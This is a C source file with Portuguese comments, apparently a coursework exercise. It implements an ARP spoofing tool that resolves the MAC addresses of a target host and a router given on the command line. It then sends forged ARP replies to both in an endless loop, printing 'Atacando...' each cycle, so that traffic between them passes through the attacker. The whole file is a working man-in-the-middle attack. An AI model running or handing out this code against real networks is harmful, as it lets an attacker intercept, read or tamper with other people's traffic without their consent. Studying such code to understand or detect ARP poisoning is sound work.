#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/ether.h>
#include <arpa/inet.h>
#include <linux/if_packet.h>

#define BUFFER_SIZE 1600
#define ETHERTYPE 0x0806
#define MAC_ADDR_LEN 6

struct arp_data
{
	unsigned char sender_mac[6];
	unsigned char sender_ip[4];
	unsigned char target_mac[6];
	unsigned char target_ip[4];
};

int main(int argc, char *argv[])
{
	int fd;
	struct ifreq if_idx;
	unsigned char buffer[BUFFER_SIZE];
	unsigned char waka[BUFFER_SIZE];
	unsigned char *data;
	struct ifreq ifr;
	struct ifreq if_mac;
	struct sockaddr_ll socket_address;
	char ifname[IFNAMSIZ];
	unsigned char mac_roteador[6];
	unsigned char mac_alvo[6];

	if (argc <= 2) {
		printf("Usage: %s iface\n", argv[0]);
		return 1;
	}
	strcpy(ifname, argv[1]);

	/* Cria um descritor de socket do tipo RAW */
	fd = socket(PF_PACKET,SOCK_RAW, htons(ETH_P_ALL));
	if(fd < 0) {
		perror("socket");
		exit(1);
	}

	/* Obtem o indice da interface de rede */
	strcpy(ifr.ifr_name, ifname);
	if(ioctl(fd, SIOCGIFINDEX, &ifr) < 0) {
		perror("ioctl");
		exit(1);
	}

	/* Obtem o indice da interface de rede */
	memset(&if_idx, 0, sizeof (struct ifreq));
	strncpy(if_idx.ifr_name, ifname, IFNAMSIZ - 1);
	if (ioctl(fd, SIOCGIFINDEX, &if_idx) < 0) {
		perror("SIOCGIFINDEX");
		exit(1);
	}

	/* Obtem as flags da interface */
	if (ioctl(fd, SIOCGIFFLAGS, &ifr) < 0){
		perror("ioctl");
		exit(1);
	}

	/* Coloca a interface em modo promiscuo */
	ifr.ifr_flags |= IFF_PROMISC;
	if(ioctl(fd, SIOCSIFFLAGS, &ifr) < 0) {
		perror("ioctl");
		exit(1);
	}

	/* Obtem o endereco MAC da interface local */
	memset(&if_mac, 0, sizeof (struct ifreq));
	strncpy(if_mac.ifr_name, ifname, IFNAMSIZ - 1);
	if (ioctl(fd, SIOCGIFHWADDR, &if_mac) < 0) {
		perror("SIOCGIFHWADDR");
		exit(1);
	}

	char buffer_request[BUFFER_SIZE];
	char dest_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; //broadcast
	int fr_len = 0;
	short int e_type = htons(0x0806);

	socket_address.sll_ifindex = if_idx.ifr_ifindex;
	socket_address.sll_halen = ETH_ALEN;
	memcpy(socket_address.sll_addr, dest_mac, MAC_ADDR_LEN);

	memset(buffer_request, 0, BUFFER_SIZE);
	memcpy(buffer_request, dest_mac, MAC_ADDR_LEN);
	fr_len += MAC_ADDR_LEN;
	memcpy(buffer_request + fr_len, if_mac.ifr_hwaddr.sa_data, MAC_ADDR_LEN);
	fr_len += MAC_ADDR_LEN;
	memcpy(buffer_request + fr_len, &e_type, sizeof(e_type));
	fr_len += sizeof(e_type);
	struct arphdr* arp_request_header = malloc(sizeof(struct arphdr)); //struct criada para arp_request_header :)
	arp_request_header->ar_hrd = htons(0x0001);
	arp_request_header->ar_pro = htons(0x0800); 
	arp_request_header->ar_hln = 6; 
	arp_request_header->ar_pln = 4;
	arp_request_header->ar_op = htons(0x0001);
	memcpy(buffer_request + fr_len, arp_request_header, sizeof(struct arphdr));  //fr_len atualizado depois da struct fr_len = tamanho do pacote
	fr_len += sizeof(struct arphdr);
	memcpy(buffer_request + fr_len, if_mac.ifr_hwaddr.sa_data, MAC_ADDR_LEN);
	fr_len += MAC_ADDR_LEN;
	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, ifname, IFNAMSIZ-1);
	ioctl(fd, SIOCGIFADDR, &ifr);
	in_addr_t our_ip = inet_addr(inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
	memcpy(buffer_request + fr_len, &our_ip, 0x04);
	fr_len += 0x04;
	memset(buffer_request + fr_len, 0x00, MAC_ADDR_LEN);
	fr_len += MAC_ADDR_LEN;
	in_addr_t ipAlvo = inet_addr(argv[2]);
	memcpy(buffer_request + fr_len, &ipAlvo, 0x04);
	fr_len += 0x04;
	if (sendto(fd, buffer_request, fr_len, 0, (struct sockaddr *) &socket_address, sizeof (struct sockaddr_ll)) < 0) {
		perror("send");
		close(fd);
		exit(1);
	}

	while(1)
	{
		if (recv(fd,(char *) &buffer, BUFFER_SIZE, 0) < 0) {
			perror("recv");
			close(fd);
			exit(1);
		}


		unsigned char mac_dst[6];
		unsigned char mac_src[6];
		short int ethertype;
		memcpy(mac_dst, buffer, sizeof(mac_dst));
		memcpy(mac_src, buffer+sizeof(mac_dst), sizeof(mac_src));
		memcpy(&ethertype, buffer+sizeof(mac_dst)+sizeof(mac_src), sizeof(ethertype));
		ethertype = ntohs(ethertype);
		data = (buffer+sizeof(mac_dst)+sizeof(mac_src)+sizeof(ethertype));
		if (ethertype == ETHERTYPE) {// se for arp
			struct arphdr* cabecalho = (struct arphdr*) data;
			if (ntohs(cabecalho->ar_op) == 0x0002) { //se for arp reply
				printf("|----ARP-REPLY----|\n");
				printf("Hardware type: %04x\n", ntohs(cabecalho->ar_hrd));
				printf("Protocol type: %04x\n", ntohs(cabecalho->ar_pro));
				printf("Hardware length: %02x\n", ntohs(cabecalho->ar_hln));
				printf("Protocol length: %02x\n", ntohs(cabecalho->ar_pln));
				printf("Operation: %02x\n", ntohs(cabecalho->ar_op));
				struct arp_data* ad = (struct arp_data*)(data + sizeof(struct arphdr));
				printf("Sender hardware address: %02x::%02x::%02x::%02x::%02x::%02x\n", ad->sender_mac[0], ad->sender_mac[1], ad->sender_mac[2], ad->sender_mac[3], ad->sender_mac[4], ad->sender_mac[5]);
				printf("Sender protocol address: %d.%d.%d.%d\n", ad->sender_ip[0], ad->sender_ip[1], ad->sender_ip[2], ad->sender_ip[3]);
				printf("Target hardware address: %02x::%02x::%02x::%02x::%02x::%02x\n", ad->target_mac[0], ad->target_mac[1], ad->target_mac[2], ad->target_mac[3], ad->target_mac[4], ad->target_mac[5]);
				printf("Target protocol address: %d.%d.%d.%d\n", ad->target_ip[0], ad->target_ip[1], ad->target_ip[2], ad->target_ip[3]);
				printf("\n\n\n");
				memset(mac_alvo, 0, MAC_ADDR_LEN); //zera o vetor
				memcpy(mac_alvo, ad->sender_mac, MAC_ADDR_LEN); // 6 bytes
				break;
			}
		}
	}

	/*char buffer_request[BUFFER_SIZE];*/
	/*char dest_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; //broadcast*/
	fr_len = 0;
	e_type = htons(0x0806);

	socket_address.sll_ifindex = if_idx.ifr_ifindex;
	socket_address.sll_halen = ETH_ALEN;
	memcpy(socket_address.sll_addr, dest_mac, MAC_ADDR_LEN);

	memset(buffer_request, 0, BUFFER_SIZE);
	memcpy(buffer_request, dest_mac, MAC_ADDR_LEN);
	fr_len += MAC_ADDR_LEN;
	memcpy(buffer_request + fr_len, if_mac.ifr_hwaddr.sa_data, MAC_ADDR_LEN);
	fr_len += MAC_ADDR_LEN;
	memcpy(buffer_request + fr_len, &e_type, sizeof(e_type));
	fr_len += sizeof(e_type);
	/*struct arphdr* arp_request_header = malloc(sizeof(struct arphdr)); //struct criada para arp_request_header :)*/
	arp_request_header->ar_hrd = htons(0x0001);
	arp_request_header->ar_pro = htons(0x0800); 
	arp_request_header->ar_hln = 6; 
	arp_request_header->ar_pln = 4;
	arp_request_header->ar_op = htons(0x0001);
	memcpy(buffer_request + fr_len, arp_request_header, sizeof(struct arphdr));  //fr_len atualizado depois da struct fr_len = tamanho do pacote
	fr_len += sizeof(struct arphdr);
	memcpy(buffer_request + fr_len, if_mac.ifr_hwaddr.sa_data, MAC_ADDR_LEN);
	fr_len += MAC_ADDR_LEN;
	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, ifname, IFNAMSIZ-1);
	ioctl(fd, SIOCGIFADDR, &ifr);
	/*in_addr_t our_ip = inet_addr(inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));*/
	memcpy(buffer_request + fr_len, &our_ip, 0x04);
	fr_len += 0x04;
	memset(buffer_request + fr_len, 0x00, MAC_ADDR_LEN);
	fr_len += MAC_ADDR_LEN;
	in_addr_t ipRoteador = inet_addr(argv[3]);
	memcpy(buffer_request + fr_len, &ipRoteador, 0x04);
	fr_len += 0x04;
	if (sendto(fd, buffer_request, fr_len, 0, (struct sockaddr *) &socket_address, sizeof (struct sockaddr_ll)) < 0) {
		perror("send");
		close(fd);
		exit(1);
	}

	while(1)
	{
		if (recv(fd,(char *) &buffer, BUFFER_SIZE, 0) < 0) {
			perror("recv");
			close(fd);
			exit(1);
		}


		unsigned char mac_dst[6];
		unsigned char mac_src[6];
		short int ethertype;
		memcpy(mac_dst, buffer, sizeof(mac_dst));
		memcpy(mac_src, buffer+sizeof(mac_dst), sizeof(mac_src));
		memcpy(&ethertype, buffer+sizeof(mac_dst)+sizeof(mac_src), sizeof(ethertype));
		ethertype = ntohs(ethertype);
		data = (buffer+sizeof(mac_dst)+sizeof(mac_src)+sizeof(ethertype));
		if (ethertype == ETHERTYPE) {// se for arp
			struct arphdr* cabecalho = (struct arphdr*) data;
			if (ntohs(cabecalho->ar_op) == 0x0002) { //se for arp reply
				printf("|----ARP-REPLY----|\n");
				printf("Hardware type: %04x\n", ntohs(cabecalho->ar_hrd));
				printf("Protocol type: %04x\n", ntohs(cabecalho->ar_pro));
				printf("Hardware length: %02x\n", ntohs(cabecalho->ar_hln));
				printf("Protocol length: %02x\n", ntohs(cabecalho->ar_pln));
				printf("Operation: %02x\n", ntohs(cabecalho->ar_op));
				struct arp_data* ad = (struct arp_data*)(data + sizeof(struct arphdr));
				printf("Sender hardware address: %02x::%02x::%02x::%02x::%02x::%02x\n", ad->sender_mac[0], ad->sender_mac[1], ad->sender_mac[2], ad->sender_mac[3], ad->sender_mac[4], ad->sender_mac[5]);
				printf("Sender protocol address: %d.%d.%d.%d\n", ad->sender_ip[0], ad->sender_ip[1], ad->sender_ip[2], ad->sender_ip[3]);
				printf("Target hardware address: %02x::%02x::%02x::%02x::%02x::%02x\n", ad->target_mac[0], ad->target_mac[1], ad->target_mac[2], ad->target_mac[3], ad->target_mac[4], ad->target_mac[5]);
				printf("Target protocol address: %d.%d.%d.%d\n", ad->target_ip[0], ad->target_ip[1], ad->target_ip[2], ad->target_ip[3]);
				printf("\n\n\n");
				memset(mac_roteador, 0, MAC_ADDR_LEN); //zera o vetor
				memcpy(mac_roteador, ad->sender_mac, MAC_ADDR_LEN); // 6 bytes
				break;
			}
		}
	}

	while(1) {
		short int ethertype = htons(0x0806);
		int frame_len = 0;

		/* Indice da interface de rede */
		socket_address.sll_ifindex = if_idx.ifr_ifindex;

		/* Tamanho do endereco (ETH_ALEN = 6) */
		socket_address.sll_halen = ETH_ALEN;

		/* Preenche o buffer com 0s */
		memset(waka, 0, BUFFER_SIZE);

		/* Monta o cabecalho Ethernet */
		/* Preenche o campo de endereco MAC de destino */	
		memcpy(waka, mac_alvo, MAC_ADDR_LEN);
		frame_len += MAC_ADDR_LEN;

		/* Preenche o campo de endereco MAC de origem */
		memcpy(waka + frame_len, if_mac.ifr_hwaddr.sa_data, MAC_ADDR_LEN);
		frame_len += MAC_ADDR_LEN;

		/* Preenche o campo EtherType */
		memcpy(waka + frame_len, &ethertype, sizeof(ethertype));
		frame_len += sizeof(ethertype);

		struct arphdr* cabecalho_arp = malloc(sizeof(struct arphdr)); //struct criada para cabecalho_arp :)

		cabecalho_arp->ar_hrd = htons(0x0001);
		cabecalho_arp->ar_pro = htons(0x0800); 
		cabecalho_arp->ar_hln = 6; 
		cabecalho_arp->ar_pln = 4;
		cabecalho_arp->ar_op = htons(0x0002);

		memcpy(waka + frame_len, cabecalho_arp, sizeof(struct arphdr));  //frame_len atualizado depois da struct frame_len = tamanho do pacote
		frame_len += sizeof(struct arphdr);


		// pegar o ip

		ifr.ifr_addr.sa_family = AF_INET;

		//target MAC --- tudo zero --isso e para descobrir o MAC dos outros
		memcpy(waka + frame_len, if_mac.ifr_hwaddr.sa_data, MAC_ADDR_LEN);
		frame_len += MAC_ADDR_LEN;

		//ip=htonl(ip);
		
		//sender ip_address
		memcpy(waka + frame_len, &ipRoteador, 0x04); //ip do roteador que eu enviei por parametro
		frame_len += 0x04;

		memcpy(waka + frame_len, mac_alvo, MAC_ADDR_LEN);
		frame_len += MAC_ADDR_LEN;


		memcpy(waka + frame_len, &ipAlvo, 0x04);
		frame_len += 0x04;


		/* Envia pacote */
		if (sendto(fd, waka, frame_len, 0, (struct sockaddr *) &socket_address, sizeof (struct sockaddr_ll)) < 0) {
			perror("send");
			close(fd);
			exit(1);
		}


	//COPIA FEITA AAAA A A A A A A A A A A A A A A A A A A A A A A A A A 



		ethertype = htons(0x0806);
		frame_len = 0;

		/* Indice da interface de rede */
		socket_address.sll_ifindex = if_idx.ifr_ifindex;

		/* Tamanho do endereco (ETH_ALEN = 6) */
		socket_address.sll_halen = ETH_ALEN;

		/* Preenche o buffer com 0s */
		memset(waka, 0, BUFFER_SIZE);

		/* Monta o cabecalho Ethernet */
		/* Preenche o campo de endereco MAC de destino */	
		memcpy(waka, mac_roteador, MAC_ADDR_LEN);
		frame_len += MAC_ADDR_LEN;

		/* Preenche o campo de endereco MAC de origem */
		memcpy(waka + frame_len, if_mac.ifr_hwaddr.sa_data, MAC_ADDR_LEN);
		frame_len += MAC_ADDR_LEN;

		/* Preenche o campo EtherType */
		memcpy(waka + frame_len, &ethertype, sizeof(ethertype));
		frame_len += sizeof(ethertype);

		//struct arphdr* cabecalho_arp = malloc(sizeof(struct arphdr)); //struct criada para cabecalho_arp :)

		cabecalho_arp->ar_hrd = htons(0x0001);
		cabecalho_arp->ar_pro = htons(0x0800); 
		cabecalho_arp->ar_hln = 6; 
		cabecalho_arp->ar_pln = 4;
		cabecalho_arp->ar_op = htons(0x0002);

		memcpy(waka + frame_len, cabecalho_arp, sizeof(struct arphdr));  //frame_len atualizado depois da struct frame_len = tamanho do pacote
		frame_len += sizeof(struct arphdr);


		// pegar o ip

		ifr.ifr_addr.sa_family = AF_INET;

		//target MAC --- tudo zero --isso e para descobrir o MAC dos outros
		memcpy(waka + frame_len, if_mac.ifr_hwaddr.sa_data, MAC_ADDR_LEN);
		frame_len += MAC_ADDR_LEN;

		//ip=htonl(ip);
		
		//sender ip_address
		memcpy(waka + frame_len, &ipAlvo, 0x04); //ip do roteador que eu enviei por parametro
		frame_len += 0x04;

		memcpy(waka + frame_len, mac_roteador, MAC_ADDR_LEN);
		frame_len += MAC_ADDR_LEN;


		memcpy(waka + frame_len, &ipRoteador, 0x04);
		frame_len += 0x04;


		/* Envia pacote */
		if (sendto(fd, waka, frame_len, 0, (struct sockaddr *) &socket_address, sizeof (struct sockaddr_ll)) < 0) {
			perror("send");
			close(fd);
			exit(1);
		}

		printf("Atacando...\n");
		sleep(2);

	}

	exit(0);
}
